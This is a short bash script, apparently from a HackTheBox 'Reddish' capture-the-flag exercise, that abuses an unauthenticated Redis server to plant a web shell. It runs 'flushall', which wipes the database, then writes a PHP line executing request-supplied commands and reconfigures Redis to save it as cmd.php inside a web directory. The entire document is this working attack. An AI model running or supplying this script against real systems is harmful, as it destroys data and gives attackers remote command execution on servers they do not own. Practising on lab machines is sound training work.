#!/bin/bash

# https://0xdf.gitlab.io/2019/01/26/htb-reddish.html#webshell
redis-cli -h 127.0.0.1 flushall
redis-cli -h 127.0.0.1 -x set subscribetoippsecand0xdf "<? system($_REQUEST['cmd']); ?>"
redis-cli -h 127.0.0.1 config set dbfilename "cmd.php"
redis-cli -h 127.0.0.1 config set dir /var/www/html/8924d0549008565c554f8128cd11fda4/
redis-cli -h 127.0.0.1 save

